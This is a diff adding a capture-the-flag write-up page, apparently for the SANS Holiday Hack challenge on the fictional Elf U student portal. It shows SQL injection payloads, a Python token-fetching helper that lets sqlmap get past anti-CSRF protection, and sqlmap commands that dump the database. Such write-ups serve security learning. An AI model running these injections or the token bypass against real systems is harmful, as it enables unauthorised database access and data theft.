@@ -92,10 +92,45 @@
 <li class="toctree-l1"><a class="reference internal" href="question6.html">6) Splunk</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question7.html">7) Get Access To The Steam Tunnels</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question8.html">8) Bypassing the Frido Sleigh CAPTEHA</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">9) Retrieve Scraps of Paper from Server</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">9) Retrieve Scraps of Paper from Server</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#challenge">Challenge</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#answer">Answer</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#solution">Solution</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#discovery">1. Discovery</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#starting-artefacts">1.1. Starting artefacts</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#initial-investigations-with-chrome">1.2. Initial investigations with Chrome</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#solving-the-challenge">2. Solving the challenge</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#modifying-sqlmap">2.1. Modifying SQLmap</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#retrieving-the-needed-information-from-the-database">2.2. Retrieving the needed information from the database</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#reconstructing-the-paper-scraps">2.3. Reconstructing the paper scraps</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
 <li class="toctree-l1"><a class="reference internal" href="question10.html">10) Recover Cleartext Document</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question11.html">11) Open the Sleigh Shop Door</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question12.html">12) Filter Out Poisoned Sources of Weather Data</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Terminals:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/EscapeEd.html">Escape Ed &lt;&gt;</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/LinuxPath.html">Linux Path &lt;&gt;</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/XmasCheerLaser.html">Xmas Cheer Laser &lt;&gt;</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/FrostyKeypad.html">Frosty Keypad &lt;&gt;</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/HolidayHackTrail.html">Holiday Hack Trail &lt;&gt;</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/Nyanshell.html">Nyanshell &lt;&gt;</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/Graylog.html">Graylog &lt;&gt;</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/MongoPilfer.html">Mongo Pilfer &lt;&gt;</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/SmartBraces.html">Smart Braces</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../terminals/ZeekJSONAnalysis.html">Zeek JSON Analysis &lt;&gt;</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Appendices:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../appendices/narrative.html">Narrative</a></li>
 </ul>
 
             
@@ -160,6 +195,202 @@
             
   <div class="section" id="retrieve-scraps-of-paper-from-server">
 <h1>9) Retrieve Scraps of Paper from Server<a class="headerlink" href="#retrieve-scraps-of-paper-from-server" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="challenge">
+<h2>Challenge<a class="headerlink" href="#challenge" title="Permalink to this headline">¶</a></h2>
+<p>Difficulty: 4/5</p>
+<p>Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa’s cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.</p>
+</div>
+<div class="section" id="answer">
+<h2>Answer<a class="headerlink" href="#answer" title="Permalink to this headline">¶</a></h2>
+</div>
+<div class="section" id="solution">
+<h2>Solution<a class="headerlink" href="#solution" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="discovery">
+<h3>1. Discovery<a class="headerlink" href="#discovery" title="Permalink to this headline">¶</a></h3>
+<p>The following dialog with Krampus indicated that we were looking for information about Krampus.</p>
+<blockquote>
+<div><p>As for those scraps of paper, I scanned those and put the images on my server.
+I then threw the paper away.
+Unfortunately, I managed to lock out my account on the server.
+Hey! You’ve got some great skills. Would you please hack into my system and retrieve the scans?</p>
+</div></blockquote>
+<p>We also had the following dialog from Pepper Minstix:</p>
+<blockquote>
+<div><p>Have you had any luck retrieving scraps of paper from the Elf U server?
+You might want to look into SQL injection techniques.
+OWASP is always a good resource for web attacks.
+For blind SQLi, I’ve heard Sqlmap is a great tool.
+In certain circumstances though, you need custom tamper scripts to get things going!</p>
+</div></blockquote>
+<p>Pepper Minstix also provided with a link to a blog post titled <a class="reference external" href="https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win">SQLMap Tamper Scripts for The Win</a></p>
+<p>The hint from Pepper Minstix was useful because it showed that SQLMap would be helpful for solving the challenge. It also hinted that we may have to perform some customisations with SQLMap to defeat protection mechanisms.</p>
+<div class="section" id="starting-artefacts">
+<h4>1.1. Starting artefacts<a class="headerlink" href="#starting-artefacts" title="Permalink to this headline">¶</a></h4>
+<ul class="simple">
+<li><p><a class="reference external" href="https://studentportal.elfu.org/">Student Portal</a></p></li>
+</ul>
+</div>
+<div class="section" id="initial-investigations-with-chrome">
+<h4>1.2. Initial investigations with Chrome<a class="headerlink" href="#initial-investigations-with-chrome" title="Permalink to this headline">¶</a></h4>
+<p>The student had two pages which accepted user input and could possibly be exploited:</p>
+<ul class="simple">
+<li><p>Apply Now page</p></li>
+<li><p>Check Application Status page</p></li>
+</ul>
+<div class="section" id="apply-now-page">
+<h5>1.2.1. Apply Now page<a class="headerlink" href="#apply-now-page" title="Permalink to this headline">¶</a></h5>
+<p>The <strong>Apply Now</strong> page consisted of an application form to study at Elf U with various user submitted fields.</p>
+<p>The form has some checks for user input for fields such as the email address. However these checks are client-side and can easily be circumvented by modifying the relevant DOM elements. In this case you can change the <code class="docutils literal notranslate"><span class="pre">type=&quot;email&quot;</span></code> attribute to <code class="docutils literal notranslate"><span class="pre">type=&quot;text&quot;</span></code>.</p>
+<p>The form is submitted using a POST request. Typical form data looked something like:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">name</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">elfmail</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">40</span><span class="n">test</span><span class="o">.</span><span class="n">com</span><span class="o">&amp;</span><span class="n">program</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">phone</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">whyme</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">essay</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">token</span><span class="o">=</span><span class="n">MTAxMDQwMTI2MzM2MTU3ODc1MTk3NDEwMTA0MDEyNi4zMzY</span><span class="o">%</span><span class="mi">3</span><span class="n">D_MTI5MzMxMzYxNzEwMDgzMjMzMjg0MDQyLjc1Mg</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span>
+</pre></div>
+</div>
+<p>An interesting thing we noticed was that if you submit an application with an identical email field twice, you receive the following error:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Error</span><span class="p">:</span> <span class="n">INSERT</span> <span class="n">INTO</span> <span class="n">applications</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">elfmail</span><span class="p">,</span> <span class="n">program</span><span class="p">,</span> <span class="n">phone</span><span class="p">,</span> <span class="n">whyme</span><span class="p">,</span> <span class="n">essay</span><span class="p">,</span> <span class="n">status</span><span class="p">)</span> <span class="n">VALUES</span> <span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;pending&#39;</span><span class="p">)</span> <span class="n">Duplicate</span> <span class="n">entry</span> <span class="s1">&#39;1&#39;</span> <span class="k">for</span> <span class="n">key</span> <span class="s1">&#39;elfmail&#39;</span>
+</pre></div>
+</div>
+<p>The column names in the INSERT statement are the same as the fields used in the above POST request.</p>
+<p>If we try injecting some SQL that is illegal, we obtain an error message the the DBMS is MariaDB.</p>
+<p>We decided to attempt an inband XPATH injection in the “First Name” input box. The contents of <strong>First Name</strong> should be <code class="docutils literal notranslate"><span class="pre">1',</span> <span class="pre">'1',</span> <span class="pre">'test&#64;test.com'</span> <span class="pre">or</span> <span class="pre">updatexml(1,concat(0x7e,(database())),0)</span> <span class="pre">or</span> <span class="pre">'','1','1','1','pending');</span> <span class="pre">#</span></code>. The remaining fields can be anything that passes the client-side filters (e.g. enter something like <strong>test&#64;test.com</strong> for the Email field). The following information is returned showing that the database name is <strong>elfu</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Error</span><span class="p">:</span> <span class="n">INSERT</span> <span class="n">INTO</span> <span class="n">applications</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">elfmail</span><span class="p">,</span> <span class="n">program</span><span class="p">,</span> <span class="n">phone</span><span class="p">,</span> <span class="n">whyme</span><span class="p">,</span> <span class="n">essay</span><span class="p">,</span> <span class="n">status</span><span class="p">)</span> <span class="n">VALUES</span> <span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;test@test.com&#39;</span> <span class="ow">or</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="n">database</span><span class="p">())),</span><span class="mi">0</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;pending&#39;</span><span class="p">);</span> <span class="c1">#&#39;, &#39;test@test.com&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;pending&#39;)</span>
+<span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">&#39;~elfu&#39;</span>
+</pre></div>
+</div>
+<p>Performing inband injections based on INSERT quickly became tedious and we decided to take a look at the other page.</p>
+</div>
+<div class="section" id="check-application-status-page">
+<h5>1.2.2. Check Application Status page<a class="headerlink" href="#check-application-status-page" title="Permalink to this headline">¶</a></h5>
+<p>The <strong>Check Application Status</strong> page consisted of a form with a single Email field from which you could check your application status.</p>
+<p>The form was submitted as a GET request. A typical URL looked something like:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>https://studentportal.elfu.org/application-check.php?elfmail=test%40test.com&amp;token=MTAxMDQwMTE5Mjk2MTU3ODc1MTg2NDEwMTA0MDExOS4yOTY%3D_MTI5MzMxMzUyNjk4ODgzMjMzMjgzODE3LjQ3Mg%3D%3D
+</pre></div>
+</div>
+<p>The form has some checks for user input for fields such as the email address. However these checks are client-side and can easily be circumvented by modifying the relevant DOM elements. In this case you can change the <code class="docutils literal notranslate"><span class="pre">type=&quot;email&quot;</span></code> attribute to <code class="docutils literal notranslate"><span class="pre">type=&quot;text&quot;</span></code>.</p>
+<p>Peforming an invalid inband injection such as <code class="docutils literal notranslate"><span class="pre">';SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">applications;#</span></code> returns the following error:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Error</span><span class="p">:</span> <span class="n">SELECT</span> <span class="n">status</span> <span class="n">FROM</span> <span class="n">applications</span> <span class="n">WHERE</span> <span class="n">elfmail</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span><span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">applications</span><span class="p">;</span><span class="c1">#&#39;;</span>
+<span class="n">You</span> <span class="n">have</span> <span class="n">an</span> <span class="n">error</span> <span class="ow">in</span> <span class="n">your</span> <span class="n">SQL</span> <span class="n">syntax</span><span class="p">;</span> <span class="n">check</span> <span class="n">the</span> <span class="n">manual</span> <span class="n">that</span> <span class="n">corresponds</span> <span class="n">to</span> <span class="n">your</span> <span class="n">MariaDB</span> <span class="n">server</span> <span class="n">version</span> <span class="k">for</span> <span class="n">the</span> <span class="n">right</span> <span class="n">syntax</span> <span class="n">to</span> <span class="n">use</span> <span class="n">near</span> <span class="s1">&#39;SELECT * FROM applications;#&#39;&#39; at line 1</span>
+</pre></div>
+</div>
+<p>Exploiting a SELECT query to return data is simpler than using an INSERT query so we decided to concentrate our efforts on this page.</p>
+</div>
+<div class="section" id="token-protection">
+<h5>1.2.3. Token protection<a class="headerlink" href="#token-protection" title="Permalink to this headline">¶</a></h5>
+<p>Both pages that we looked at so far employed a token to protect against automated requests. This also made it more difficult to use an automated tool such as SQLMap.</p>
+<p>Before any of the forms was submitted, the code would make a request to <a class="reference external" href="https://studentportal.elfu.org/validator.php">https://studentportal.elfu.org/validator.php</a>. A token would be returned in the body of the response. This token would then be submitted as one of the fields during form submission.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>With this token protection, performing inband SQL injections works because the form would request the appropriate token.</p>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="solving-the-challenge">
+<h3>2. Solving the challenge<a class="headerlink" href="#solving-the-challenge" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="modifying-sqlmap">
+<h4>2.1. Modifying SQLmap<a class="headerlink" href="#modifying-sqlmap" title="Permalink to this headline">¶</a></h4>
+<p>SQLMap is a open source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.</p>
+<p>To use SQLMap with the Student Portal, we needed to find a way to defeat the token protection. The hints described a possible way of doing this was to utilise the tamper functionality and write a custom module. We found the instructions for doing this a bit finicky, and instead chose to use the <code class="docutils literal notranslate"><span class="pre">--eval</span></code> option. This option evaluates the provided Python code before each request.</p>
+<p>As shown below, we wrote a simple Python script (validate.py) that we placed in the same directory as the SQLMap tool.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="k">def</span> <span class="nf">getToken</span><span class="p">():</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://studentportal.elfu.org/validator.php&#39;</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+    <span class="k">return</span> <span class="n">token</span>
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>This module has a dependency on the <strong>requests</strong> library which can be installed using something like <code class="docutils literal notranslate"><span class="pre">pip</span> <span class="pre">install</span> <span class="pre">requests</span></code>.</p>
+</div>
+<p>To run SQLMap we need to use something like the following:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">sqlmap</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;https://studentportal.elfu.org/application-check.php?elfmail=test&amp;token=&quot;</span> <span class="o">--</span><span class="nb">eval</span><span class="o">=</span><span class="s2">&quot;import validate;token=validate.getToken()&quot;</span> <span class="o">-</span><span class="n">v</span> <span class="mi">3</span>
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>During the automated testing you may get a prompt about ‘token’ holding a anti-CSRF token. We <strong>do not</strong> want SQLMap to automatically update this token in further requests.</p>
+</div>
+<p>Running the above analysis returns the following as shows that this page is exploitable.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sqlmap</span> <span class="n">resumed</span> <span class="n">the</span> <span class="n">following</span> <span class="n">injection</span> <span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="kn">from</span> <span class="nn">stored</span> <span class="n">session</span><span class="p">:</span>
+<span class="o">---</span>
+<span class="n">Parameter</span><span class="p">:</span> <span class="n">elfmail</span> <span class="p">(</span><span class="n">GET</span><span class="p">)</span>
+    <span class="n">Type</span><span class="p">:</span> <span class="n">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
+    <span class="n">Title</span><span class="p">:</span> <span class="n">OR</span> <span class="n">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span> <span class="o">-</span> <span class="n">WHERE</span> <span class="ow">or</span> <span class="n">HAVING</span> <span class="n">clause</span> <span class="p">(</span><span class="n">NOT</span> <span class="o">-</span> <span class="n">MySQL</span> <span class="n">comment</span><span class="p">)</span>
+    <span class="n">Payload</span><span class="p">:</span> <span class="n">elfmail</span><span class="o">=</span><span class="n">test</span><span class="s1">&#39; OR NOT 9290=9290#&amp;token=</span>
+    <span class="n">Vector</span><span class="p">:</span> <span class="n">OR</span> <span class="n">NOT</span> <span class="p">[</span><span class="n">INFERENCE</span><span class="p">]</span><span class="c1">#</span>
+
+    <span class="n">Type</span><span class="p">:</span> <span class="n">error</span><span class="o">-</span><span class="n">based</span>
+    <span class="n">Title</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.0</span> <span class="n">OR</span> <span class="n">error</span><span class="o">-</span><span class="n">based</span> <span class="o">-</span> <span class="n">WHERE</span><span class="p">,</span> <span class="n">HAVING</span><span class="p">,</span> <span class="n">ORDER</span> <span class="n">BY</span> <span class="ow">or</span> <span class="n">GROUP</span> <span class="n">BY</span> <span class="n">clause</span> <span class="p">(</span><span class="n">FLOOR</span><span class="p">)</span>
+    <span class="n">Payload</span><span class="p">:</span> <span class="n">elfmail</span><span class="o">=</span><span class="n">test</span><span class="s1">&#39; OR (SELECT 4443 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(4443=4443,1))),0x7170786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- XAHQ&amp;token=</span>
+    <span class="n">Vector</span><span class="p">:</span> <span class="n">OR</span> <span class="p">(</span><span class="n">SELECT</span> <span class="p">[</span><span class="n">RANDNUM</span><span class="p">]</span> <span class="n">FROM</span><span class="p">(</span><span class="n">SELECT</span> <span class="n">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">CONCAT</span><span class="p">(</span><span class="s1">&#39;[DELIMITER_START]&#39;</span><span class="p">,([</span><span class="n">QUERY</span><span class="p">]),</span><span class="s1">&#39;[DELIMITER_STOP]&#39;</span><span class="p">,</span><span class="n">FLOOR</span><span class="p">(</span><span class="n">RAND</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="o">.</span><span class="n">PLUGINS</span> <span class="n">GROUP</span> <span class="n">BY</span> <span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">)</span>
+
+    <span class="n">Type</span><span class="p">:</span> <span class="n">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
+    <span class="n">Title</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.0</span><span class="o">.</span><span class="mi">12</span> <span class="n">AND</span> <span class="n">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span> <span class="p">(</span><span class="n">query</span> <span class="n">SLEEP</span><span class="p">)</span>
+    <span class="n">Payload</span><span class="p">:</span> <span class="n">elfmail</span><span class="o">=</span><span class="n">test</span><span class="s1">&#39; AND (SELECT 8445 FROM (SELECT(SLEEP(5)))EOvD)-- yTjJ&amp;token=</span>
+    <span class="n">Vector</span><span class="p">:</span> <span class="n">AND</span> <span class="p">(</span><span class="n">SELECT</span> <span class="p">[</span><span class="n">RANDNUM</span><span class="p">]</span> <span class="n">FROM</span> <span class="p">(</span><span class="n">SELECT</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">([</span><span class="n">SLEEPTIME</span><span class="p">]</span><span class="o">-</span><span class="p">(</span><span class="n">IF</span><span class="p">([</span><span class="n">INFERENCE</span><span class="p">],</span><span class="mi">0</span><span class="p">,[</span><span class="n">SLEEPTIME</span><span class="p">])))))[</span><span class="n">RANDSTR</span><span class="p">])</span>
+<span class="o">---</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="retrieving-the-needed-information-from-the-database">
+<h4>2.2. Retrieving the needed information from the database<a class="headerlink" href="#retrieving-the-needed-information-from-the-database" title="Permalink to this headline">¶</a></h4>
+<p>We used the following commands to obtain information about the paper scraps. The output has been truncated to show only information of interest.</p>
+<div class="section" id="list-databases">
+<h5>2.2.1. List databases<a class="headerlink" href="#list-databases" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">sqlmap</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;https://studentportal.elfu.org/application-check.php?elfmail=test&amp;token=&quot;</span> <span class="o">--</span><span class="nb">eval</span><span class="o">=</span><span class="s2">&quot;import validate;token=validate.getToken()&quot;</span> <span class="o">--</span><span class="n">dbs</span>
+
+<span class="n">available</span> <span class="n">databases</span> <span class="p">[</span><span class="mi">2</span><span class="p">]:</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">elfu</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">information_schema</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="list-tables">
+<h5>2.2.2. List tables<a class="headerlink" href="#list-tables" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">sqlmap</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;https://studentportal.elfu.org/application-check.php?elfmail=test&amp;token=&quot;</span> <span class="o">--</span><span class="nb">eval</span><span class="o">=</span><span class="s2">&quot;import validate;token=validate.getToken()&quot;</span> <span class="o">--</span><span class="n">tables</span>
+
+<span class="n">Database</span><span class="p">:</span> <span class="n">elfu</span>
+<span class="p">[</span><span class="mi">3</span> <span class="n">tables</span><span class="p">]</span>
+<span class="o">+---------------------------------------+</span>
+<span class="o">|</span> <span class="n">applications</span>                          <span class="o">|</span>
+<span class="o">|</span> <span class="n">krampus</span>                               <span class="o">|</span>
+<span class="o">|</span> <span class="n">students</span>                              <span class="o">|</span>
+<span class="o">+---------------------------------------+</span>
+
+<span class="n">Database</span><span class="p">:</span> <span class="n">information_schema</span>
+<span class="p">[</span><span class="mi">78</span> <span class="n">tables</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="dump-the-krampus-table">
+<h5>2.2.3. Dump the krampus table<a class="headerlink" href="#dump-the-krampus-table" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">sqlmap</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;https://studentportal.elfu.org/application-check.php?elfmail=test&amp;token=&quot;</span> <span class="o">--</span><span class="nb">eval</span><span class="o">=</span><span class="s2">&quot;import validate;token=validate.getToken()&quot;</span> <span class="o">--</span><span class="n">dump</span> <span class="o">-</span><span class="n">T</span> <span class="n">krampus</span>
+
+<span class="n">Database</span><span class="p">:</span> <span class="n">elfu</span>
+<span class="n">Table</span><span class="p">:</span> <span class="n">krampus</span>
+<span class="p">[</span><span class="mi">6</span> <span class="n">entries</span><span class="p">]</span>
+<span class="o">+----+-----------------------+</span>
+<span class="o">|</span> <span class="nb">id</span> <span class="o">|</span> <span class="n">path</span>                  <span class="o">|</span>
+<span class="o">+----+-----------------------+</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="mi">0</span><span class="n">f5f510e</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="mi">1</span><span class="n">cc7e121</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="mi">439</span><span class="n">f15e6</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">4</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="mi">667</span><span class="n">d6896</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">5</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="n">adb798ca</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
+<span class="o">|</span> <span class="mi">6</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="n">ba417715</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
+<span class="o">+----+-----------------------+</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="reconstructing-the-paper-scraps">
+<h4>2.3. Reconstructing the paper scraps<a class="headerlink" href="#reconstructing-the-paper-scraps" title="Permalink to this headline">¶</a></h4>
+<p>We found information about 6 paper scraps in the previous section. To retrieve the scraps we had to simply append the path to <strong>https://studentportal.elfu.org</strong></p>
+<p>We then rotated and aligned the scraps to form the following document (one piece seems to be missing).</p>
+</div>
+</div>
+</div>
 </div>
 
 
